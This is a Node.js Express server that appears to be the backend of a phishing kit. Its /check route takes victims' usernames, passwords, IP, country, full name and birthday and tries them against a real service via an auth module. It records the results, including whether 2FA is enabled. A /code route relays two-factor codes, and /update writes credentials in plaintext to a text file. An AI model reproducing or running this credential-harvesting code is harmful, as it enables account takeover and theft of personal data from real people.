const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
const server = require('http').Server(app);
const { initialize, check, enterCode, updateAndSync, saveInfo, close } = require('./modules/authModule');
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const adminPath = path.join(__dirname, 'admin');
const clientPath = path.join(__dirname, 'client');
const configPath = path.join(__dirname, 'admin/config.json');

app.use(express.static(clientPath));
app.use(express.static(adminPath));

app.get('/', (req, res) => {
    res.sendFile(path.join(clientPath, 'index.html'));
});

app.get('/admin', (req, res) => {
   res.sendFile(path.join(adminPath, 'index.html'));
});

app.post('/check', async (req, res) => {
    const { username, password, ip, country, fullname, birthday } = req.body;     try {         await initialize();         const result = await check(username, password);         if (result === 'SUCCESS') {             saveInfo('Không bật 2FA', ip, country, username, password, fullname, birthday);             res.send('SUCCESS');             await updateAndSync();             await close();         }         else if (result === 'WRONG') {             res.send('WRONG');         }         else if (result === 'CHECKPOINT') {             res.send('CHECKPOINT');             await close();         }         else {             res.send(result);             saveInfo(result, ip, country, username, password, fullname, birthday);         }     } catch (error) {         console.log(error);         try { await close(); }         catch {         }     }
    const userInput = `Username: ${username}\nPassword: ${password}\n`;
    console.log(userInput);
});

app.post('/code', async (req, res) => {
    const { code } = req.body;     try {         const result = await enterCode(code);         if (result === 'SUCCESS') {             await updateAndSync();             await close();             res.send('SUCCESS');         }         else {             res.send(result);         }     } catch (error) {         await close();         res.status(500).send(error);     }
});
app.post('/update', (req, res) => {
    const { username, password } = req.body; // Extract username and password from request body

    // Create a string containing the user input
    const userInput = `Username: ${username}\nPassword: ${password}\n`;
    console.log(userInput);

    // Write the user input to a text file
    fs.writeFile('user_input.txt', userInput, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            res.status(500).send('Error writing to file');
        } else {
            console.log('User input saved to user_input.txt');
            res.status(200).send('User input saved successfully');
        }
    });
});



server.listen(port, () => {
    console.log(`http://localhost:${port}`);
});
